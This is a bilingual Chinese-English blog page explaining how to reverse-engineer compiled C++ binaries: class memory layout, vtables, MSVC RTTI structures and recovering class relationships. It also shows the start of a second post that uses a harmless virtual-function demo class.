<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>scr1pt's blog</title><meta name="description" content="my dear virus, please fuck me"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/05/22/cppLearning/">cppReverse</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.cmlab.csie.ntu.edu.tw/__cathyp_eBooks_C___Reverse_20c___pdf/index.pdf">https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.cmlab.csie.ntu.edu.tw/__cathyp_eBooks_C___Reverse_20c___pdf/index.pdf</a></p>
<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf">https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf</a></p>
</blockquote>
<h2 id="judge-c"><a href="#judge-c" class="headerlink" title="judge c++"></a>judge c++</h2><p>As a natural way to start, the reverser must first determine if a specific target is indeed a compiled C++ binary and is using C++ constructs. Below are some pertinent indications that the binary being analyzed is a C++ binary and is using C++ constructs.</p>
<ol>
<li>Heavy use of ECX(this ptr),One of the first things that a reverser may see is the heavy use of ecx (which is used as the this pointer). One place the reverser may see it is that it is being assigned a value just before a function is about to be called:</li>
</ol>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520195013869.png" alt="image-20220520195013869"></p>
<p>Another place is if a function is using ecx without first initializing it, which suggests that this is a possible class member function:</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520195000763.png" alt="image-20220520195000763"></p>
<h3 id="calling-convention"><a href="#calling-convention" class="headerlink" title="calling convention"></a>calling convention</h3><p>Calling Convention. Related to (1), Class member functions are called with the usual function parameters in the stack and with ecx pointing to the class’s object (i.e. this pointer.). Here is an example of a class instantxiation, in which the allocated class object (eax) will eventually be passed to ecx and then invocation of the constructor follows.</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520195810536.png" alt="image-20220520195810536"></p>
<p>此外，reverser要注意到间接函数调用，这些调用更可能是虚拟函数；当然，如果不首先了解实际类或在调试器下运行代码，很难跟踪这些调用的去向。考虑以下虚拟函数调用示例：</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520200722178.png" alt="image-20220520200722178"></p>
<p>在这种情况下，reverser必须首先知道ClassA的虚拟函数表（vftable）的位置，然后根据vftable中列出的函数列表确定函数的实际地址。</p>
<h2 id="类实例结构"><a href="#类实例结构" class="headerlink" title="类实例结构"></a>类实例结构</h2><h3 id="普通类"><a href="#普通类" class="headerlink" title="普通类"></a>普通类</h3><p>在我们深入之前我们应该熟悉类在内存中的结构布局</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520214836110.png" alt="image-20220520214836110"></p>
<p>我们需要把padding增加到最后一个成员变量以确保size为4字节的倍数。</p>
<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520215713706.png" alt="image-20220520215713706"></p>
<p>here’s the class layout</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520215739428.png" alt="image-20220520215739428"></p>
<p>请注意，在布局的开头添加了指向虚拟函数表的指针。此表按声明顺序包含虚拟函数的地址。Ex2类的虚拟函数表将像这样。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520220019231.png" alt="image-20220520220019231"></p>
<p>现在，如果一个类从另一个类继承呢？以下是当一个类从单个类（即单个继承）继承时会发生什么：</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520220112250.png" alt="image-20220520220112250"></p>
<p>And the layout,我们可以看到存在两个var1在这个内存中。<img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520220551662.png" alt="image-20220520220551662"></p>
<p>如您所见，派生类的布局简单地附加到基类的布局中。在多次继承的情况下，情况如下：</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220520221648717.png" alt="image-20220520221648717"></p>
<p>如您所见，如果每个基类的实例数据将嵌入派生类的实例中，并且每个包含虚拟函数的基类将有自己的vftable。请注意，fist base class与当前对象共享vftable。当前对象的虚拟函数将附加到第一个基类虚拟函数列表的末尾</p>
<h2 id="类识别"><a href="#类识别" class="headerlink" title="类识别"></a>类识别</h2><p>我们上面已经讨论了如何判断一个程序是不是用 C++写的，讨论了类的构造函数以及内存中类的实例的组织形式，这一节我们来讨论 C++的类在可执行文件 中的使用情况。我们先来讨论如何确定内存中哪些部分是类(或者称为对象)下 一节再来讨论如何确定类之间的关系以及类中的成员。</p>
<ol>
<li><p>识别构造函数和析构函数</p>
<ol>
<li><p>全局对象。全局对象顾名思义就是那些被声明为全局变量的对象。这些对象的内存空间在编译时就已经被分配好了的， 它们位于可执行文件的数据段中。这些对象的构造函数是在这个程序启动以后，main调用之前被调用执行的，而它们的析构函数是在程序退出（exit）时被调用的。</p>
<p> 一般来说，如果我们发现一个函数调用时，传入的是this指针（一般是使用ecx寄存器）是指向一个全局变量的话，我们基本可以确定，这是一个全局变量，我们可以利用交叉引用找到该全局变量的构造函数和析构函数，如果该段代码位于entrypoint和main函数之间，那么很有可能这个为构造函数</p>
<p> main函数</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_main proc near</span><br><span class="line"></span><br><span class="line">argc= dword ptr  <span class="number">4</span></span><br><span class="line">argv= dword ptr  <span class="number">8</span></span><br><span class="line">envp= dword ptr  <span class="number">0</span>Ch</span><br><span class="line"></span><br><span class="line">mov     dword_403378, <span class="number">3</span></span><br><span class="line"><span class="keyword">xor</span>     eax, eax</span><br><span class="line">retn</span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure>

<p> 通过交叉引用可以找到两处，也就是构造函数和析构函数</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521141409121.png" alt="image-20220521141409121"></p>
<p> 跟进构造函数,<code>_atexit</code>注册了程序终止的函数为析构函数</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521141914948.png" alt="image-20220521141914948"></p>
<p> 运行到返回后发现程序位于entrypoint和main函数之间，属于编译器生成的代码，通过call _initterm函数调用了构造函数</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521143307579.png" alt="image-20220521143307579"></p>
</li>
<li><p>局部对象。这些对象的作用域起始于该对象被声明的地方，结束于声明该对象的模块退出之时(比如函数结尾或者分支结束的地方，下面例子里就是在一个 if 语句块 结束的地方调用析构函数的)。局部对象在内存中是位于栈(stack)里的。 它们的构造函数在该对象声明的地方被调用，而在对象离开其作用域时调用 对象的析构函数。<br> 局部对象的构造函数还是比较容易识别的，如果你发现一个函数调用， 传递过去的 this 指针竟然是指向了栈中一个未被初始化过的变量的话，你基 本上可以确定这个函数是一个对象的构造函数，同时也就发现了一个对象。 析构函数一般则是与构造函数位于同一个模块(也就是声明该对象的模块) 的最后一个使用指向该对象的 this 指针的函数。</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521150912632.png" alt="image-20220521150912632"></p>
</li>
<li><p>动态分配的对象，这种对象是通过new操作符动态创建的对象。实际上，new操作符会变成两个符号调用：一个new()函数的调用再接着一个构造函数的调用。new()函数是用来在堆中分配空间的（对象的大小通过参数传给new函数），然后把心分配的地址存在EAX寄存器返回出来。同样delete也会变成析构函数和free()函数。</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521152155003.png" alt="image-20220521152155003"></p>
</li>
</ol>
</li>
<li><p>通过RTTI进行多态类识别（Run-Time-Type Information）</p>
</li>
</ol>
<p>如果C++在编译的时候启用了RTTI功能，那么我们又会多一种识别类的方法。特别是对多态类（包含虚函数的类）。RTTI是C++中提供的一种在运行时确定对象类型的机制，在C++中一般时候typeid和dynamic_cast这两个操作符来实现这一机制。这两个操作符在实现时需要获得相关类的类名，类的层次等相关信息，在实际使用VC的时候，如果你用了以上两种操作符号但没有启用RTTI，编译器将会给你一个警告。在默认情况下MSVC6.0关闭了RTTI功能。而MSVC2005中默认开启了RTTI。</p>
<ol>
<li><p>RTTICompleteObjectLocator</p>
<p> 这个结构体包含了两个指针，一个指向实际的类信息，另一个指向类的继承关系。</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Type</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>DW</td>
<td>signature</td>
<td>Always 0 ？</td>
</tr>
<tr>
<td>0x04</td>
<td>DW</td>
<td>offset</td>
<td>Offset of Vtable within the class</td>
</tr>
<tr>
<td>0x08</td>
<td>DW</td>
<td>cdoffset</td>
<td>?</td>
</tr>
<tr>
<td>0x0c</td>
<td>DW</td>
<td>pTypeDescription</td>
<td>Class Information</td>
</tr>
<tr>
<td>0x10</td>
<td>DW</td>
<td>pClassHierarchyDescription</td>
<td>Class Hierarchy Information</td>
</tr>
</tbody></table>
<p> 那么怎么找到这个结构体呢？我们只要找到虚函数表的上一个DWORD指向的即为RTTICompleteObjectLocator。</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521161903162.png" alt="image-20220521161903162"></p>
<p> 这是RTTICompleteObjectLocator结构</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521162047050.png" alt="image-20220521162047050"></p>
</li>
<li><p>TypeDescriptor</p>
<p> 位于RTTICompleteObjectLocator结构的第四个DWORD是一个指向本类的TypeDescriptor结构体的指针，TypeDescriptor这个结构体中记录了这个类的类名、</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Type</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>DW</td>
<td>pVFTable</td>
<td>Always points to type_info’s vftable</td>
</tr>
<tr>
<td>0x04</td>
<td>DW</td>
<td>spare</td>
<td>?</td>
</tr>
<tr>
<td>0x08</td>
<td>SZ</td>
<td>name</td>
<td>Class Name</td>
</tr>
</tbody></table>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521190238726.png" alt="image-20220521190238726"></p>
</li>
<li><p>RTTIClassHierarchyDescriptor</p>
<p> RTTIClassHierarchyDescriptor记录了类的继承信息、包括基类的数量以及一个RTTIBaseClassDescriptor数组，RTTIBaseClassDescriptor在下面详细讨论，RTTIBaseClassDescriptor最终将指向当前各个基类的TypeDescriptor。</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Type</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>DW</td>
<td>signature</td>
<td>Always 0 ？</td>
</tr>
<tr>
<td>0x04</td>
<td>DW</td>
<td>attributes</td>
<td>Bit 0 - multiple inheritance;Bit 1 - virtual inheritance</td>
</tr>
<tr>
<td>0x08</td>
<td>DW</td>
<td>numBaseClasses</td>
<td>number of base classes, Count includes the class itself</td>
</tr>
<tr>
<td>0x0c</td>
<td>DW</td>
<td>pBaseClassArray</td>
<td>Array of RTTIBaseClassDescriptor</td>
</tr>
</tbody></table>
<p> 当classG 虚拟继承了classA和classE，那么结构如下。包括ClassG自身，我们可以看到<code>numBaseClasses = 3</code>。<code>attributes = 3 </code>表示它既是多继承又是虚继承，最后一个BaseClassArray指向RTTIBaseClassDescriptor</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521191535688.png" alt="image-20220521191535688"></p>
</li>
<li><p>RTTIBaseClassDescriptor</p>
</li>
</ol>
<p>这个结构体包含了基类的有关信息。它包括一个指向基类的TypeDescriptor的指针和一个指向基类的RTTIClassHierarchyDescriptor的指针，（VC6.0中可能没有pBaseClassArray）。另外，它还包含有一个PMD结构体，该结构体中记录了该类中的各个基类的位置。RTTIBaseClassDescriptor结构如下。</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Type</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>DW</td>
<td>pTypeDescriptor</td>
<td>TypeDescriptor of the base class</td>
</tr>
<tr>
<td>0x04</td>
<td>DW</td>
<td>numContainedBases</td>
<td>Number of direct bases of this base class</td>
</tr>
<tr>
<td>0x08</td>
<td>DW</td>
<td>PMD.mdisp</td>
<td>vftable offset</td>
</tr>
<tr>
<td>0x0c</td>
<td>DW</td>
<td>PMD.pdisp</td>
<td>vbtable offset(-1:vftable is at displacement PMD.mdisp inside the class)</td>
</tr>
<tr>
<td>0x10</td>
<td>DW</td>
<td>PMD.vdisp</td>
<td>displacement of base class vftable pointer inside the vbtable</td>
</tr>
</tbody></table>
<p>一个vbtable（Virtual base class table)是由多重虚拟继承生成的。因为在多重继承的情况下，有时候需要upclass。这时候就需要精确定位基类。虚基类表包含了各个基类在派生类中的位置（或者说各个基类的虚函数表在派生类中的位置，因为虚函数表是基于类的起始位置的）。</p>
<p>根据之前所说的ClassG类声明，编译器会生成以下类结构</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521210502725.png" alt="image-20220521210502725"></p>
<p>在如上这种情况下，vbcase存在于位移0x04处，另一方面，vbtable包含派生类内每个基类的位移：</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521210907045.png" alt="image-20220521210907045"></p>
<p>那么我们尝试利用vbtable来确定基类的真实地址。首先可以看到ClassE的偏移是4，然后我们从虚基类表中读取出classE的偏移为16，那么16 +4 &#x3D; 20，ClassE位于ClassG +0x14 处,也就是下图的<code>0x00418b14</code>地址处。</p>
<p>以下为ClassG中ClassE的<code>BaseClassDescriptor</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220521211249241.png" alt="image-20220521211249241"></p>
<p>那么总结如下的关系图</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522091012407.png" alt="image-20220522091012407"></p>
<h2 id="识别类关系"><a href="#识别类关系" class="headerlink" title="识别类关系"></a>识别类关系</h2><h3 id="通过构造器识别类关系"><a href="#通过构造器识别类关系" class="headerlink" title="通过构造器识别类关系"></a>通过构造器识别类关系</h3><p>构造函数包含初始化对象的代码，例如调用基类的构造函数和设置vftables。因此，分析构造函数可以让我们很好地了解这个类与其他类的关系。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522091427369.png" alt="image-20220522091427369"></p>
<p>让我们假设我们已经确定这个函数是通过之前所说方法识别的构造函数。现在，我们看到一个函数正在使用当前对象的这个指针调用。这可以是当前类的成员函数，也可以是基类的构造函数。</p>
<p>我们怎么知道是哪一个？事实上，仅仅通过查看生成的代码，就无法完美区分两者。然而，在现实世界的应用中，在此步骤之前，构造函数很有可能被识别在较前的位置，因此我们所要做的就是将这些信息关联起来，以得出更准确的标识。换句话说，如果使用当前对象的此指针在另一个构造函数中调用预先确定为构造函数的函数，它可能是基类的构造函数。</p>
<p>手动识别这一点需要检查对这个函数的其他交叉引用，看看这个函数是否是二进制文件中其他地方调用的构造函数。我们将在本文件后面讨论自动识别方法。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522091913348.png" alt="image-20220522091913348"></p>
<p>多重继承实际上比单一继承更容易发现。与单个继承示例一样，第一个调用的函数可以是成员函数，也可以是基类构造函数。请注意，在反汇编中，调用第二个函数之前，在此指针中添加4个字节。这表明正在初始化另一个基类。</p>
<p>Here’s the layout for this class to help you visualize. The disassembly above belongs to the constructor of class D. Class D is derived from two other classes, A and C:</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522092402038.png" alt="image-20220522092402038"></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522092414415.png" alt="image-20220522092414415"></p>
<h3 id="通过RTTI识别多态类关系"><a href="#通过RTTI识别多态类关系" class="headerlink" title="通过RTTI识别多态类关系"></a>通过RTTI识别多态类关系</h3><p>我们在之前的RTTI中讲到RTTIClassHierarchyDescriptor结构体如下</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Type</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>DW</td>
<td>signature</td>
<td>Always 0 ？</td>
</tr>
<tr>
<td>0x04</td>
<td>DW</td>
<td>attributes</td>
<td>Bit 0 - multiple inheritance;Bit 1 - virtual inheritance</td>
</tr>
<tr>
<td>0x08</td>
<td>DW</td>
<td>numBaseClasses</td>
<td>number of base classes, Count includes the class itself</td>
</tr>
<tr>
<td>0x0c</td>
<td>DW</td>
<td>pBaseClassArray</td>
<td>Array of RTTIBaseClassDescriptor</td>
</tr>
</tbody></table>
<p>我们可以通过这个结构体的pBaseClassArray数组来判断非直接基类，如：类A有基类类B，类C，但是类B中存在类C，那么类C就是类A的非直接基类。以下为关系图</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522093145721.png" alt="image-20220522093145721"></p>
<p>而其结构图如下</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522093215268.png" alt="image-20220522093215268"></p>
<h3 id="识别类的成员"><a href="#识别类的成员" class="headerlink" title="识别类的成员"></a>识别类的成员</h3><p>识别类成员是一个简单明了的过程，尽管缓慢而乏味。我们可以通过查找相对于此指针的偏移量访问来识别类成员变量：</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522093643884.png" alt="image-20220522093643884"></p>
<p>我们还可以通过查找对相对于此对象虚拟函数表偏移量的指针的间接调用来识别虚拟函数成员：</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522093705706.png" alt="image-20220522093705706"></p>
<p>通过检查此指针是否作为隐藏参数传递给函数调用，可以识别非虚拟成员函数。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522093758525.png" alt="image-20220522093758525"></p>
<p>为了确保这确实是一个成员函数，我们可以检查被调用的函数是否使用ecx，而无需首先初始化它。让我们看看sub_401110的代码</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220522093849886.png" alt="image-20220522093849886"></p>
<ul>
<li>通过指针偏移量来进行成员变量的赋值 mov dword ptr[eax+8], 12345h</li>
<li>通过vftable指针来获取虚函数，关键为mov edx, [ecx],获取了虚函数指针指向的地址，然后通过mov eax, [edx+4]获取虚函数指针</li>
<li>通过lea ecx,[ebp_var_c]，隐藏传递参数给函数调用，注意此处不是64位二进制文件<ul>
<li>同时检查被调用的函数是否使用ecx而无需初始化，也就是直接使用之前隐藏传递进来给函数调用的对象指针</li>
</ul>
</li>
</ul>
<h2 id="Automation"><a href="#Automation" class="headerlink" title="Automation"></a>Automation</h2><p>to be continuing…</p>
<h2 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h2><p>STL代码和导入的DLL。确定示例是否为C++二进制文件的另一种方法是目标是否使用STL代码，该代码可以通过导入函数或库签名标识（如IDA的FLIRT）确定：</p>
<p>to be continueing…</p>
<h2 id="reverse-c-binary"><a href="#reverse-c-binary" class="headerlink" title="reverse c++ binary"></a>reverse c++ binary</h2><ul>
<li>还原类的构造函数</li>
<li>还原类的析构函数</li>
<li>还原类的成员函数</li>
<li>还原类的虚函数</li>
<li>还原类的继承层次</li>
<li>判断一个类是否是抽象类</li>
</ul>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a><strong>References</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://flagbot.ch/lesson6.pdf">Lesson 6: Introduction to Reversing C++ Binaries</a></li>
<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf">blackhat Automation Techniques in C++ Reverse Engineering</a></li>
</ul>
<h3 id="Ready-IDA"><a href="#Ready-IDA" class="headerlink" title="Ready IDA"></a>Ready IDA</h3><ul>
<li>HexRaysPyTools: Extremely useful for quickly creating structures without having to find every offset that might be a field.</li>
<li>Classy: Makes working with vtables and child classes a lot easier.</li>
</ul>
<h4 id="other-settings"><a href="#other-settings" class="headerlink" title="other settings"></a>other settings</h4><ul>
<li>Make sure to regularly create a snapshot of your database</li>
<li>Create&#x2F;open database</li>
<li>make sure the compiler options are correct</li>
<li>(Optional)Always show demangled names (Options → Demangled names → Select Names)</li>
</ul>
<h3 id="theory"><a href="#theory" class="headerlink" title="theory"></a>theory</h3><h4 id="class-layout-in-Memory"><a href="#class-layout-in-Memory" class="headerlink" title="class layout in Memory"></a>class layout in Memory</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ususally stored in the data section</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">vtable</span>&#123;</span><br><span class="line">    <span class="built_in">void</span> (*func1)();</span><br><span class="line">    <span class="built_in">void</span> (*func2)();</span><br><span class="line">&#125;;t</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">class</span>&#123;</span><br><span class="line">    vtable* vtbl;</span><br><span class="line">  	<span class="type">int</span> member1;</span><br><span class="line">  	<span class="type">int</span> member2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="decompiler"><a href="#decompiler" class="headerlink" title="decompiler"></a>decompiler</h4><p>this patterns means below in decompiler</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 v1 = operater new(sizeof(class));</span><br><span class="line">*v1 = gvtable; // stored someware in .data</span><br><span class="line">*(v1+4) = 0;</span><br><span class="line">*(v1+8) = 0;</span><br></pre></td></tr></table></figure>

<p>call a vtable function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(void (*)())(*(_QWORD*)v1 + 8))();</span><br></pre></td></tr></table></figure>

<h2 id="Reconstruct-Class"><a href="#Reconstruct-Class" class="headerlink" title="Reconstruct Class"></a>Reconstruct Class</h2><p>to be continue…</p>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>to be continue…</p>
<h2 id="符号恢复"><a href="#符号恢复" class="headerlink" title="符号恢复"></a>符号恢复</h2><p>to be continue…</p>
<p><a target="_blank" rel="noopener" href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Maktm/FLIRTDB">https://github.com/Maktm/FLIRTDB</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/maroueneboubakri/lscanDW">https://github.com/maroueneboubakri/lscanDW</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-05-22</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 3819 words, 12 min 43 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/05/19/virtualFunc/">Kovter__b8113a604e6c190bbd8b687fd2ba7386d4d98234f5138a71bcf15f0a3c812e91</a></h3></div><div class="post-content"><div class="card"><p><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>C++是一门支持面向对象的语言，为面向对象的软件开发提供了丰富的语言支持。要想高效、正确地使用C++中的继承、多台等语言特性，就必须对这些特性的底层有一定的了解。</p>
<p>其实，C++的对象模型的核心概念并不多，最重要的概念是虚函数。虚函数式程序运行时定义的函数。虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的饮用通常放在一个专用数组————虚函数表（Virtual Table，VBTL）中，数组的每个元素中存放的就是类中虚函数的地址。调用虚函数时，程序先取出虚函数指针（Virtual Table Pointer，VPTR），得到虚函数表的地址，再根据这个地址到虚函数表中取出该函数的地址，最后调用该函数。</p>
<h2 id="x32-demo-code"><a href="#x32-demo-code" class="headerlink" title="x32 demo code"></a>x32 demo code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CSum</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (a + b);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">Sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (a - b);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	CSum* pCSum = <span class="keyword">new</span> CSum;</span><br><span class="line">	pCSum-&gt;<span class="built_in">Add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	pCSum-&gt;<span class="built_in">Sub</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>首先会使用new函数分配class所需的内存（由IDA识别）。调用成功后保存在eax寄存器中，最后传到ecx。</p>
<p>我们可以看到，v3指向了虚函数表，通过指针进行调用Add和Sub函数。</p>
<p>而且需要注意到，程序以ecx作为this指针的载体传递给虚函数成员函数，并利用两次间接寻址得到虚函数的正确地址从而执行。</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517132723253.png" alt="image-20220517132723253"></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220517132332719.png" alt="image-20220517132332719"></p>
<p>虚函数表</p>
